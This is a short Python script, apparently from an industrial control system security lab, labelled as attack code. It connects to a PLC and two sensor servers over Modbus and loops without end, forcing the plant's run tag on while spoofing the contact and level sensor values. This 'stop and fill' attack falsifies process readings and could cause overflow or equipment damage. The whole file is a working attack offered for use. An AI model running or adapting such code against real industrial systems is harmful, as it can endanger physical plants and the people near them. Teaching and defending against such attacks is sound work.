#!/usr/bin/env python

#########################################
# Imports
#########################################
# - Logging
import logging

# - Attack communication
from modbus	import ClientModbus as Client
from modbus	import ConnectionException 

# - World environement
from world	import *

#########################################
# Logging
#########################################
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Stop and fill code
#####################################
client1 = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
client2 = Client(CONTACT_SERVER_IP, port=CONTACT_SERVER_PORT)
client3 = Client(LEVEL_SERVER_IP, port=LEVEL_SERVER_PORT)

try:
    client1.connect()
    client2.connect()
    client3.connect()
    while True:
        rq = client1.write(PLC_TAG_RUN, 1)  # Run Plant, Run!
        rq = client2.write(CONTACT_TAG_SENSOR, 1)   # Contact Sensor
        rq = client3.write(LEVEL_TAG_SENSOR, 0)     # Level Sensor
except KeyboardInterrupt:
    client1.close()
    client2.close()
    client3.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
